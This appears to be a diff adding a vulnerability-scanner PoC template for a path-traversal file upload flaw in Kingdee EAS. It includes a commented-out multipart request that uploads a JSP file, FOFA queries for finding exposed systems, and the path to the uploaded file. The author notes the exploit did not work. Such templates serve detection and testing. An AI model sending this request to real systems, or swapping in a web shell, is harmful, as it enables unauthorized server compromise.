@@ -1,0 +1,30 @@
+name: poc-yaml-Kingdee-EAS-myUploadFile-file-upload
+rules:
+  # - method: POST
+  #   path: /easportal/buffalo/%2e%2e/cm/myUploadFile.do
+  #   headers:
+  #       Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
+  #   body: |-
+  #     ------WebKitFormBoundarySq4lDnabv8CwHfvx
+  #     Content-Disposition: form-data; name="myFile"; filename="test.jsp"
+  #     Content-Type: text/html
+
+  #     <%out.println("test");%>
+  #     ------WebKitFormBoundarySq4lDnabv8CwHfvx--
+  #   expression: |
+  #     response.status == 200
+  - method: GET
+    path: /easportal/buffalo/%2e%2e/cm/myUploadFile.do
+    expression: |
+      response.status == 200 
+detail:
+  author: test
+  info: |
+    没打成功
+    fofa:
+      title=="EAS系统登录"
+      app="Kingdee-EAS"
+    上传成功访问：
+    http://127.0.0.1/easportal/buffalo/../test.jsp
+  links:
+    - https://mp.weixin.qq.com/s/Y1kunxDzArp_e5xqp1lbYQ
